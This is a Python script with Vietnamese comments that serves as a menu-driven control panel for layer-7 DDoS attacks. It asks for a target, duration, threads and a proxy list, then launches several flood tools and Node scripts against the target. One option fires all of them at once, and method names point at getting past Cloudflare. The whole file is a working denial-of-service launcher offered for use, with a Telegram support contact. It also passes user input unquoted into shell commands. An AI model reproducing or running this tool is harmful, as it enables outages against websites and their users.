# Chương trình được thu thập, biên dịch và phát triển từ Đậu Đậu
import subprocess
import os
from os import name, system

if name == 'nt':
    system("title Đậu Đậu - HTTP2 Tunner")
    system("mode 101, 30")

# Hàm để chạy các lệnh shell khởi động script nodejs
def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)

# Đếm số proxy trong tệp
def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    # Loại bỏ dòng trắng và các dòng chỉ chứa khoảng trắng
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)

# Hiển thị menu chọn script
def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("  ____________________________________ ")
    print("                 𝗙𝗱𝗘-𝗖𝟮                                  ")
    print("  ____________________________________\n ")
    print()
    print("============= Method layer 7 ============\n")
    print("  [1] - HTTPdestroy")
    print("  [2] - StresserUS")
    print("  [3] - TLS-FdE-C2")
    print("  [4] - CF-GLACIER")
    print("  [5] - HTTPS-SOCKET")
    print("  [6] - PRIVATE-ALL")
    print("  [7] - TLS-kill")
    print("  [0] - Back")
    print("=========================================")

# Xử lý lựa chọn script từ người dùng
def handle_menu_selection(selection):
    if selection == '1':
        print("\n============== HTTPdestroy ==============")
        target = input("    target: ")
        time = input("    time: ")
        requests = input("    requests per IP: ")
        thread = input("    thread: ")
        proxy_file = input("    file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("============== HTTPdestroy ==============")
        print(f"  Information Attack>>>>>>>>>")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  Start Attack (Enter)\n")
        os.system(f"chmod 777 httpdestroy")
        proxy_count = count_proxy(proxy_file)
        print(f"  Total Proxy: {proxy_count}")
        os.system(f"./httpdestroy {target} {time} {requests} {thread} {proxy_file}")

    elif selection == '2':
        print("\n=============== StresserUS ==============")
        target = input("    target: ")
        limit = input("    Rate limit: ")
        time = input("    time: ")
        proxy_file = input("    file proxy: ")
        thread = input("    thread: ")
        mode = input("    mode: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== StresserUS ==============")
        print(f"  Information Attack>>>>>>>>>")
        print(f"  Target: {target}")
        print(f"  Rate limit: {limit}")
        print(f"  Time: {time}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Thread: {thread}")
        print(f"  Mode: {mode}")
        print("=========================================")
        input("  Start Attack (Enter)\n")
        os.system(f"chmod +x StresserUS")
        proxy_count = count_proxy(proxy_file)
        print(f"  Total Proxy: {proxy_count}")
        os.system(f"./StresserUS version=2 host={target} limit={limit} time={time} list={proxy_file} threads={thread} mode={mode}")
#./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>

    elif selection == '3':
        print("\n================= TLS FdE-C2 =================")
        target = input("    target: ")
        time = input("    time: ")
        rate = input("    rate: ")
        thread = input("    thread: ")
        proxy_file = input("    proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= TLS FdE-C2 =================")
        print(f"  Information Attack>>>>>>>>>")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Time: {rate}")
        print(f"  Time: {thread}")
        print(f"  Time: {proxy_file}")
        print()
        print(f"  Information Default")
        print(f"  Proxyfile: proxy.txt")
        print(f"  Uafile: ua.txt")
        print("=========================================")
        input("  Start Attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Total Proxy: {proxy_count}")
        run_script('tlss.js', [target, time, rate, thread, proxy_file])

    elif selection == '4':
        print("\n================= CF-GLACIER ================")
        method = input("    method: ")
        target = input("    target: ")
        proxy_file = input("    proxy: ")
        time = input("    time: ")
        RequestIP = input("    Request Per IP: ")
        thread = input("    thread: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= CF-GLACIER ================")
        print(f"  Information Attack>>>>>>>>>")
        print(f"  method: {method}")
        print(f"  Target: {target}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Time: {time}")
        print(f"  RequestIP: {RequestIP}")
        print(f"  Thread: {thread}")
     
        print("=========================================")
        input("  Start Attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Total Proxy: {proxy_count}")     
        run_script('CF-GLACIER.js', [method, target, proxy_file, time, RequestIP, thread])

    elif selection == '5':
        print("\n================== HTTPS-SOCKET ==================")
        target = input("    target: ")
        time = input("    time: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================== CFS ==================")
        print(f"  Information Attack>>>>>>>>>")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print("=========================================")
        input("  Start Attack (Enter)\n")
        proxy_count = count_proxy('socks5.txt')
        print(f"  Total Proxy: {proxy_count}")
        print(f"\n  Started attack")
        print(f"  Have question? telegram @lowtofast\n")
        run_script('socket.js', [target, time])

    elif selection == '6':
        print("\n=============== PRIVATE-ALL ==============")
        method = input("    method: ")
        target = input("    target: ")
        proxy_file = input("    proxy: ")
        time = input("    time: ")
        limit = input("    limit: ")
        request = input("    Request Per IP: ")
        thread = input("    thread: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== TLS-BYPASS ==============")
        print(f"  Information Attack>>>>>>>>>")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Limit: {limit}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Requests per IP: {request}")
        print("=========================================")
        input("  Start Attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Total Proxy: {proxy_count}")
        print(f"\n  Started attack")
        print(f"  Have question? telegram @lowtofast\n")
        os.system(f"./httpdestroy {target} {time} {request} {thread} {proxy_file}")
        os.system(f"./StresserUS version=2 host={target} limit={limit} time={time} list={proxy_file} threads={thread} mode={method}")
        run_script('tlss.js', [target, time, limit, thread, proxy_file])
        run_script('CF-GLACIER.js', [method, target, proxy_file, time, request, thread])
        run_script('socket.js', [target, time])

    elif selection == '7':
        print("\n================ TLS-kill ===============")
        target = input("  Target ( https ): ")
        thread = input("  thread: ")
        requests = input("  requests per IP: ")
        mode = input(" Mode ( Get/Post ): ")
        time = input("  time: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================ TLS-kill ================")
        print(f" Information Attack>>>>>>>>>")
        print(f"  Target: {target}")
        print(f"  Thread: {thread}")
        print(f"  Requests per IP: {requests}")
        print(f"  Mode: {mode}")
        print(f"  Time: {time}")
        print()
        print(f"  Information Default")
        print(f"  Proxyfile: http.txt")
        print(f"  Uafile: ua.txt")
        print("==========================================")
        input("  Start Attack (Enter)\n")
        proxy_file = "http.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  Total Proxy: {proxy_count}")
        print(f"\n  Started attack")
        print(f"  Have question? telegram @lowtofast\n")
        run_script('TLS-kill.js', [target, thread, requests, mode, time])

    else:
        print("  You Select Wrong")

# Khởi động panel
def start_panel():
    while True:
        show_menu()
        selection = input("  Select Panel Layer (0-7): ")
        
        if selection == '0':
            break
        
        if selection not in ['1', '2', '3', '4', '5', '6', '7']:
            print(" Your Select No Valid!!!!! ")
            continue
        
        handle_menu_selection(selection)

# Bắt đầu chạy panel
start_panel()

